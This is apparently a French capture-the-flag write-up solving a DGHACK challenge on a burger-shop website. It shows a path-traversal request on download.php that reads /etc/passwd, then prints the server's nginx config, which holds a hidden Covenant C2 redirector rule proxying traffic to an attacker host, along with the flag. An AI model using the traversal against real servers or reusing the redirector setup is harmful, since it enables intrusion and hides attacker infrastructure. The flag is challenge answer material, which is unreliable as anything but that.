# Un chasseur sachant chasser partie 1

> Des analystes SOC du Ministère des Armées ont remarqué des flux suspects provenant de machines internes vers un site vitrine d'une entreprise. Pourtant ce site semble tout à fait légitime.
>
> Vous avez été mandaté par la Direction Générale de l'Armement pour mener l'enquête. Trouvez un moyen de reprendre partiellement le contrôle du site web afin de trouver comment ce serveur joue un rôle dans l'infrastructure de l'acteur malveillant.
>
> Aucun fuzzing n'est nécessaire.
>
> Le flag se trouve sur le serveur à l'endroit permettant d'en savoir plus sur l'infrastructure de l'attaquant.

## Description

On a accès à un site web de commande de burgers.

La plupart des pages sont statiques à l'exception de la page permettant de télécharger le menu : `/download.php?menu=menu_updated_09_11_2022.jpg`.

Je tente un path traversal : `/download.php?menu=../../../../../etc/passwd` et j'obtiens le fichier.

## Solution

Reste maintenant à savoir quel fichier chercher.
D'après la description, on a besoin de trouver l'infrastructure de l'acteur malveillant.

Après avoir téléchargé les pages du site, j'ai essayé de trouver des logs (pour serveurs Apache et nginx).
Il se trouve que les logs nginx existent même s'ils sont vides.

J'ai donc cherché la configuration dans `/etc/nginx/nginx.conf` :

```conf
worker_processes auto;
error_log stderr warn;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {

    include mime.types;
    default_type application/octet-stream;

    # Define custom log format to include reponse times
    log_format main_timed '$remote_addr - $remote_user [$time_local] "$request" '
                          '$status $body_bytes_sent "$http_referer" '
                          '"$http_user_agent" "$http_x_forwarded_for" '
                          '$request_time $upstream_response_time $pipe $upstream_cache_status';

    access_log /dev/stdout main_timed;
    error_log /dev/stderr notice;

    server_tokens off;

    keepalive_timeout 65;

    # Write temporary files to /tmp so they can be created as a non-privileged user
    client_body_temp_path /tmp/client_temp;
    proxy_temp_path /tmp/proxy_temp_path;
    fastcgi_temp_path /tmp/fastcgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    scgi_temp_path /tmp/scgi_temp;

    # Default server definition

    server {

        listen 80 default_server;
        server_name _;

        sendfile off;
        tcp_nodelay on;
        absolute_redirect off;

        root /var/www/html;
        index index.html;

        location / {
            # First attempt to serve request as file, then
            # as directory, then fall back to index.php
            try_files $uri $uri/ /index.php?q=$uri&$args;
        }

        # Redirect server error pages to the static page /50x.html
        error_page 500 502 503 504 /50x.html;
        location = /50x.html {
            root /var/lib/nginx/html;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_split_path_info ^(.+\.php)(/.+)$;
            fastcgi_pass unix:/run/php-fpm.sock;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param SCRIPT_NAME $fastcgi_script_name;
            fastcgi_index index.php;
            include fastcgi_params;
        }

        # Deny access to . files, for security
        location ~ /\. {
            log_not_found off;
            deny all;
        }

        # Website Acquisition : done.
        # This rule is to become our redirector c2.
        # Covenant 0.5 works on a Linux docker.
        # The GRUNT port must be tcp/8000-8250.
        # DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}
        location ^~ /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72 {
            limit_except GET POST PUT { deny all; }
            rewrite /1d8b4cf854cd42f4868849c4ce329da72c406cc11983b4bf45acdae0805f7a72/(.*) /$1  break;
            proxy_pass https://covenant-attacker.com:7443;
        }
    }
}
```

Flag : `DGHACK{L3s_D0ux_Burg3r5_se_s0nt_f4it_pwn_:(}`.